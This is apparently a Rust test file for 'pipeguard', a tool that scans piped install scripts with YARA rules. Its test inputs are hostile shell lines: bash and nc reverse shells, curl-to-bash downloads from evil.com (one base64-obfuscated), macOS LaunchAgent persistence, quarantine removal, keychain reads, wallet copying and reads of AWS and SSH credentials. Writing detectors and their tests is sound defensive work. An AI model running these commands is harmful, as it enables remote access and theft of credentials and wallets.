use assert_cmd::Command;
use predicates::prelude::*;
use std::path::PathBuf;

fn pipeguard_cmd() -> Command {
    Command::cargo_bin("pipeguard").unwrap()
}

fn core_rules_path() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("rules/core.yar")
}

// =============================================================================
// Integration tests with core YARA rules
// =============================================================================

#[test]
fn detects_reverse_shell_bash() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        .assert()
        .failure()
        .stdout(predicate::str::contains("High"))
        .stdout(predicate::str::contains("reverse_shell"));
}

#[test]
fn detects_reverse_shell_nc() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("nc -e /bin/sh 10.0.0.1 4444")
        .assert()
        .failure()
        .stdout(predicate::str::contains("reverse_shell"));
}

#[test]
fn detects_staged_download() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("curl https://evil.com/payload.sh | bash")
        .assert()
        .failure()
        .stdout(predicate::str::contains("staged"));
}

#[test]
fn detects_base64_obfuscation() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("eval $(echo 'Y3VybCBodHRwczovL2V2aWwuY29tL3NjcmlwdC5zaCB8IGJhc2g=' | base64 -d)")
        .assert()
        .failure()
        .stdout(predicate::str::contains("Base64").or(predicate::str::contains("obfuscation")));
}

#[test]
fn detects_launchagent_persistence() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            mkdir -p ~/Library/LaunchAgents
            cat > ~/Library/LaunchAgents/com.evil.plist << EOF
            <?xml version="1.0"?>
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.evil</string>
            </dict>
            </plist>
            EOF
        "#)
        .assert()
        .failure()
        .stdout(predicate::str::contains("persistence").or(predicate::str::contains("LaunchAgent")));
}

#[test]
fn detects_quarantine_bypass() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("xattr -d com.apple.quarantine /Applications/Evil.app")
        .assert()
        .failure()
        .stdout(predicate::str::contains("quarantine"));
}

#[test]
fn detects_amos_indicators() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("security find-generic-password -a user -s service -w")
        .assert()
        .failure()
        .stdout(predicate::str::contains("AMOS").or(predicate::str::contains("keychain")));
}

#[test]
fn detects_crypto_wallet_targeting() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            cp -r ~/Library/Application\ Support/Exodus/exodus.wallet ~/tmp/
            zip -r wallets.zip ~/tmp/exodus.wallet
        "#)
        .assert()
        .failure()
        .stdout(predicate::str::contains("crypto").or(predicate::str::contains("wallet")));
}

#[test]
fn detects_credential_harvesting() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            cat ~/.aws/credentials
            cat ~/.ssh/id_rsa
        "#)
        .assert()
        .failure()
        .stdout(predicate::str::contains("Credential").or(predicate::str::contains("harvesting")));
}

#[test]
fn allows_clean_homebrew_install() {
    // Legitimate Homebrew install should pass
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/bash
            echo "Homebrew Installer"
            # This is a simplified version
            mkdir -p /usr/local/bin
            echo "Installation complete"
        "#)
        .assert()
        .success()
        .stdout(predicate::str::contains("No threats"));
}

#[test]
fn allows_clean_rustup_install() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            #!/bin/sh
            # Rustup installer (simplified)
            echo "Welcome to Rust!"
            mkdir -p ~/.cargo/bin
            echo "Done."
        "#)
        .assert()
        .success()
        .stdout(predicate::str::contains("No threats"));
}

// =============================================================================
// Edge cases and combinations
// =============================================================================

#[test]
fn detects_multi_stage_attack() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(r#"
            curl -s https://evil.com/stage1.sh -o /tmp/s1.sh
            curl -s https://evil.com/stage2.sh -o /tmp/s2.sh
            curl -s https://evil.com/stage3.sh -o /tmp/s3.sh
            bash /tmp/s1.sh
        "#)
        .assert()
        .failure();
}

#[test]
fn json_output_contains_all_fields() {
    let output = pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--format")
        .arg("json")
        .write_stdin("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        .assert()
        .failure();

    let stdout = String::from_utf8_lossy(&output.get_output().stdout);
    assert!(stdout.contains("\"threat_level\""));
    assert!(stdout.contains("\"is_threat\""));
    assert!(stdout.contains("\"content_hash\""));
}
